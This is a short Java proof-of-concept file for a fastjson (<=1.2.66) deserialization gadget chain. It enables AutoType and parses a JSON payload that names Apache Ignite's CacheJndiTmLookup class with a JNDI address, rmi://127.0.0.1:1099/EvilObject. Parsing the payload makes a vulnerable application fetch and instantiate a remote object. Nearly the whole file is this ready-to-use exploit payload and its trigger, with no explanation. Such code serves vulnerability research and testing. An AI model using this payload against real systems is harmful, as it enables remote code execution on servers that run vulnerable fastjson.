import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

//@dependency{fastjson:<=1.2.66,ignite-jta-incubating}
public class cachejnditmlookup {
    public static void main(String[] args){
        String payload = "{\"@type\":\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\",\"jndiNames\":[\"rmi://127.0.0.1:1099/EvilObject\"]}";
        ParserConfig config = new ParserConfig();
        config.getGlobalInstance().setAutoTypeSupport(true);
        Object res = JSON.parseObject(payload);

    }
}
